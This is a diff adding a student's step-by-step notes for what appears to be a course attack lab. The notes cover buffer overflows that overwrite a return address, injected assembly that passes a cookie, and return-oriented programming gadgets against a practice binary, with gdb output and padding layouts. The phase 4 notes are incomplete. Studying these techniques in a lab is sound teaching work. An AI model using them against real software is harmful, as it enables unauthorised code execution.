@@ -1,0 +1,150 @@
+files needed
+---------------------------------------------------------------------------------------------
+    Phase 1: p1hexa.txt -> p1hexa.dat
+    Phase 2: p2assembly.s -> p2assembly.o, p2hexa.txt -> p2hexa.dat
+    Phase 3: p3assembly.s -> p3assembly.o, p3hexa.txt -> p3hexa.dat
+    Phase 4: p4hexa.txt -> p4hexa.dat
+---------------------------------------------------------------------------------------------
+
+Injection process
+---------------------------------------------------------------------------------------------
+write assembly in assembly.s
+in terminal: cc -c assembly.s 
+in terminal: objdump -d assembly.o /* this will show you the hex of your assembly on left */
+copy results and paste into hexa.txt /* comment out the assembly on the right */
+in terminal: ./hex2raw < hexa.txt > hexa.dat
+in terminal: ./ctarget -i hexbytes.dat /* to run */
+---------------------------------------------------------------------------------------------
+
+Process for phase 1
+---------------------------------------------------------------------------------------------
+in terminal: gdb ctarget
+in gdb: b getbuf
+in gdb: run
+in gdb: disas
+disas shows us that we allocate 40(0x28) bytes of stack space for buffer
+in gdb: ni /* 3 times */
+we are asked to type a string, lets type "this is not long enough"
+in gdb: x/s $rsp /* this is our string */
+in gdb: x/20wx $rsp /* shows the next 20 words in hexadecimal from $rsp*/
+    (gdb) x/20wx $rsp
+    0x5560a908:     0x73696874      0x20736920      0x20746f6e      0x676e6f6c
+    0x5560a918:     0x6f6e6520      0x00686775      0x00000000      0x00000000
+    0x5560a928:     0x00000000      0x00000000      0x004016ef      0x00000000
+    0x5560a938:     0x55685fe8      0x00000000      0x00401cf3      0x00000000
+    0x5560a948:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
+we can see the address for the test function return address (0x004016ef)
+now we know we have to input a string long enough to overwrite 0x004016ef
+we want our overwrite to call touch1
+using ctarget.s we can see the address for touch1 is 40152a
+we know that we have allocated 40 bytes of stack space
+we must fill those 40 bytes and then insert our touch1 return address (40152a)
+in p1hexa.txt make a sequence of 40 "00"'s then the touch1 return address (40152a)
+the return address must be backwards in pairs of two because of little-endian
+in terminal: ./hex2raw < p1hexa.txt > p1hexa.dat
+in terminal: ./ctarget < p1hexa.dat
+DONE
+---------------------------------------------------------------------------------------------
+
+Process for phase 2
+---------------------------------------------------------------------------------------------
+according to notes the first argument to a function is passed in register %rdi
+our assembly code must set the value of %rdi as our cookie
+we can use movq for this 
+    movq $0x3fc5a122,%rdi /* puts cookie into %rdi */
+then we can just return 
+    retq
+write this in p2assembly.s
+in terminal: cc -c p2assembly.s 
+in terminal: objdump -d p2assembly.o 
+copy and paste our translated assembly code into p2hexa.txt
+now that our assembly for the cookie is done we need to look at gdb 
+our purpose is to find the address for %rsp after Gets
+we need the address in order to jump back to the address after retq in getbuf
+in terminal: gdb ctarget 
+in gdb: b getbuf
+in gdb: run
+in gdb: disas
+disas shows us that we allocate 40(0x28) bytes of stack space for buffer
+in gdb: ni /* 3 times */
+we are asked to type a string, lets type "this is not long enough"
+in gdb: x/s $rsp 
+we see that the address for our string at %rsp is 0x5560a908
+in gdb: x/20wx $rsp /* shows the next 20 words in hexadecimal from $rsp*/
+    (gdb) x/20wx $rsp
+    0x5560a908:     0x73696874      0x20736920      0x20746f6e      0x676e6f6c
+    0x5560a918:     0x6f6e6520      0x00686775      0x00000000      0x00000000
+    0x5560a928:     0x00000000      0x00000000      0x004016ef      0x00000000
+    0x5560a938:     0x55685fe8      0x00000000      0x00401cf3      0x00000000
+    0x5560a948:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
+we can see the address for the test function return address (0x004016ef)
+we want our injected string to replace 0x004016ef with the address of $rsp (0x5560a908)
+this will cause the retq of getbuf to jump back to our injected assembly code
+after our assembly code is stepped into and completed
+the retq of the assembly code jumps back to the end of our injected string
+for this to happen we need to pad our p2hexa.txt file with enough bytes to reach the address
+this means our padding should be 32 bytes (32 "00"'s) since we have 8 bytes from our assembly
+finally we put the address of touch2 (401558) at the end of our injected string 
+in terminal: ./hex2raw < p2hexa.txt > p2hexa.dat
+in terminal: ./ctarget < p2hexa.dat
+DONE
+---------------------------------------------------------------------------------------------
+
+Process for phase 3
+---------------------------------------------------------------------------------------------
+address of $rsp from phase 2: 0x5560a908
+the total bytes before cookie are buffer + 8 + 8
+this equates to 0x28(40 bytes) + 8 bytes + 8 bytes = 56 bytes or 0x38
+add 0x38 to our address of $rsp (0x5560a908): 0x5560a908 + 0x38 = 0x5560a940
+now we need out assembly code
+first we need to move our new address into %rdi
+    movq $0x5560a940,%rdi /* $rsp + 0x38 */
+now return 
+    retq
+in terminal: cc -c p3assembly.s 
+in terminal: objdump -d p3assembly.o
+copy and paste our translated assembly code into p3hexa.txt
+we fill our buffer with enough bytes to get to the return address of getbuf (0x004016ef)
+in this case we need to get our padding to 40 bytes
+after the padding we need to insert our address for $rsp (0x5560a908)
+after our address for $rsp we need to insert the address for touch3 (40166f)
+finally we need to insert our cookie
+our cookie is initially in hex but we need it in text format so we use a converter online
+our result is 33 66 63 35 61 31 32 32, insert that as the final line in p3hexa.txt
+in terminal: ./hex2raw < p3hexa.txt > p3hexa.dat
+in terminal: ./ctarget < p3hexa.dat
+---------------------------------------------------------------------------------------------
+
+Process for phase 4
+---------------------------------------------------------------------------------------------
+possible first gadgets that could work:
+    0000000000401719 <addval_231>:
+      401719:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax
+      40171f:	c3                   	retq   
+58 is present of 3rd bit so we add 2 bytes before, 401719 + 2 = 40171b
+      
+    000000000040172e <addval_208>:
+      40172e:	8d 87 21 cf 58 91    	lea    -0x6ea730df(%rdi),%eax
+      401734:	c3                   	retq   
+58 is present of 5th bit so we add 4 bytes before, 40172e + 4 = 401732
+
+    0000000000401735 <setval_181>:
+      401735:	c7 07 58 90 90 90    	movl   $0x90909058,(%rdi)
+      40173b:	c3                   	retq   
+58 is present of 3rd bit so we add 2 bytes before, 401735 + 2 = 401737
+      
+possible second gadgets that could work:
+    0000000000401712 <setval_484>:
+      401712:	c7 07 6f 48 89 c7    	movl   $0xc789486f,(%rdi)
+      401718:	c3                   	retq   
+48 is present of 4th bit so we add 3 bytes before, 401712 + 3 = 401715
+
+    0000000000401743 <getval_468>:
+      401743:	b8 dc 48 89 c7       	mov    $0xc78948dc,%eax
+      401748:	c3                   	retq   
+48 is present of 3rd bit so we add 2 bytes before, 401743 + 2 = 401745
+
+touch2 address: 401558
+in terminal: ./hex2raw < p4hexa.txt > p4hexa.dat
+in terminal: ./ctarget < p4hexa.dat
+---------------------------------------------------------------------------------------------
